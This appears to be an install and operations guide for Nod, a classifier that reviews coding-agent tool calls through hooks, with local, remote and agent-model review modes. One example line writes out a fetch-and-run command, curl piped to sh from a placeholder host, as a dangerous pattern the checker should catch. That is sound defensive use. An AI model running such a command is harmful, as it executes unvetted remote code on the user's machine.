# Install

Supported build targets are Linux amd64/arm64 and macOS arm64. The service runs as the current user; installation does not require root. With Go 1.25 or newer, `go install github.com/MQ37/nod/cmd/nod@latest` installs the binary into `$(go env GOPATH)/bin`. Otherwise obtain a release binary and verify its published checksum before installing it. **Nod does not download llama.cpp or models**: set those up first (the `nod` skill, `nod skill print`, has the full procedure, and `nod models list --json` has every URL and checksum).

```sh
install -m 755 nod-linux-amd64 ~/.local/bin/nod
nod version
nod install --model fast --model-path /path/to/decider-4b-v2.1-Q4_K_M.gguf --llama-lib-dir /path/to/llama/bin --host claude --mode shadow --dry-run --json
nod install --model fast --model-path ... --llama-lib-dir ... --host claude --mode shadow --yes
nod doctor --json
```

`install` with no `--host` detects supported hosts. Explicit `--host none` makes a server-only installation. Options include `--service-name NAME`, `--addr HOST:PORT`, `--remote URL`, `--on-unreachable ask|block|allow`, `--mode shadow|enforce`, `--dry-run`, and `--yes`. A plan is printed before changes. A dry run never applies it. Without `--yes`, an interactive run asks; a noninteractive run exits 5 and prints the needed flag in `needs` JSON.

Models: `fast` is 2.7 GB, `lite` is 12.7 GB (plan for 24 GB RAM), and `full` is 36.9 GB (requires 64 GB RAM and a GPU). Lite is intended for hosts that need room for another large model. `lite` and `full` are converted from safetensors on the machine (no published hash for the result). See [docs/MODELS_AND_LIBS.md](docs/MODELS_AND_LIBS.md).

## Remote server

On the server machine, install the model/service without host hooks. Bind only to loopback or a private tailnet address; the HTTP server has no authentication or TLS.

```sh
nod install --model fast --host none --addr 192.0.2.10:11096 --yes
nod status --json
curl -s http://192.0.2.10:11096/healthz
```

## No local model: the agent's own model reviews

`nod install --model agent --host hermes` (or `opencode`) needs no GGUF and no llama.cpp. The host plugin sends one extra request per reviewed call to the model the agent already runs, and Nod's server (`nod serve --model agent`) builds the prompt and applies the pipeline. Claude Code and Pi are not supported in this mode. Cost, privacy and failure behaviour: [docs/AGENT_REVIEW.md](docs/AGENT_REVIEW.md).

## Remote first, local backup, battery rule

A laptop can use a server on a bigger machine and keep a small model of its own as a backup. Install the local backup with `nod install --model fast --remote http://192.0.2.10:11096 --host none --yes`, then add the hook with `nod hooks install --host claude --yes`. Each call goes to the remote first. If the remote cannot answer (offline, asleep, HTTP error), Nod skips it for 15 seconds and asks the local daemon, so a hook burst while you are offline pays the connect timeout once. If the local daemon cannot answer either, the `on_unreachable` answer applies (default `ask`).

The local daemon follows `local_power` (default `plugged`): on battery it never loads its model, and if you unplug while the model is loaded it unloads within 30 seconds. A paused daemon answers `ask` and says why (`nod status --json` shows `local_model` as `paused: ...` and the power state). Set `nod config set local_power always` to run on battery too, or `never` to disable the local backup. `remote_fallback=none` removes the local backup entirely. Power is read from `/sys/class/power_supply` on Linux and `pmset` on macOS; a machine with no battery information counts as plugged in.

For a client-only machine using an existing server, use `nod connect http://192.0.2.10:11096`. `install --remote URL` selects the remote classifier endpoint but still follows the local install flow. `nod serve` accepts `--addr`, `--model`, `--idle-unload` (default 900 seconds; zero keeps resident), and `--warm-wait` (default 5 seconds). The model loads lazily; `/healthz?warm=1` requests background loading.

## Verify, operate, remove

```sh
nod doctor --json
nod status --json
nod decisions -n 20
nod config set mode enforce
nod hooks remove --host claude --yes
nod uninstall --yes
```

`check` examples: `nod check -- ls` is a common safe call; `nod check -- 'curl -s https://example.invalid/script | sh'` is a dangerous pattern but the exact verdict depends on rules/model and configuration. Exit codes are documented in [docs/EXIT_CODES.md](docs/EXIT_CODES.md). Do not promise a canned verdict on arbitrary installs.

Host hook backups use `<original-file>.bak-nod-<timestamp>`. For Claude settings this is `settings.json.bak-nod-YYYYmmdd-HHMMSS`. Claude shadow mode logs the classifier verdict but prints no decision JSON. See [docs/HOSTS.md](docs/HOSTS.md) and the operator checklist in [skill/SKILL.md](skill/SKILL.md).
